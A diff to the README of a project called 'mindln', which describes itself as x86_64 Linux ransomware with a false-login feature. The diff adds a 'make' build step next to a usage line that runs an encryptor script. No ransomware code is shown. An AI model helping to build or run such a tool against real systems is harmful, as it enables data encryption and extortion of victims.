@@ -1,6 +1,9 @@
 # mindln
 x86_64 linux ransomware utility with false-login
 
+# make
+$ make
+
 # usage
 \# ./mindln-encryptor.sh
 
